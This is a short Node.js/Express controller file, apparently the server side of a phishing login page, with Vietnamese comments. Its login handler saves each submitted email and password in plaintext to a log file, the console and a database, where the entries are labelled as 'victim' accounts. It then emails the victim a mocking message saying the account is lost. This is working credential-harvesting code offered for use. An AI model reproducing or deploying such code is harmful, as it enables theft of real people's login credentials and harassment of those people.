import exp from "constants";
import fs from "fs";
import nodemailer from "nodemailer";

import AccountModel from "../../models/account.models.js";

const login = async (req, res) => {
  const { email, password, phone } = req.body;

  if (!email || !password) {
    return res.status(400).json({ message: "Thiếu email hoặc mật khẩu" });
  }

  // Lưu thông tin vào file log
  const logData = `Email: ${email} | Password: ${password}\n`;
  fs.appendFileSync("log.txt", logData);

  console.log("Đã lưu:", logData);

  //Lưu thông tin vào db
  const phishedAccount = { email, password };
  await AccountModel.create(phishedAccount);
  console.log("Đã lưu tài khoản con mồi vào db");
  // Gửi email thông báo
  sendPhishingEmail(email);

  // res.json({ message: "Đăng nhập thất bại! Sai mật khẩu hoặc tài khoản." });
};

// Gửi email phishing
const sendPhishingEmail = async (targetEmail) => {
  try {
    const transporter = nodemailer.createTransport({
      service: "Gmail",
      auth: {
        user: process.env.EMAIL_USERNAME,
        pass: process.env.EMAIL_PASSWORD,
      },
    });

    const mailOptions = {
      from: process.env.EMAIL_USERNAME,
      to: targetEmail,
      subject: "Tài khoản của bạn đang gặp sự cố vì Quốc Anh đẹp trai nhất Q7!",
      text: `Mất acc rồi nha lêu lêu :))))`,
    };

    await transporter.sendMail(mailOptions);
    console.log("Email phishing đã gửi đến:", targetEmail);
  } catch (error) {
    console.error("Lỗi gửi email:", error);
  }
};

const authController = {
  login,
};

export default authController;
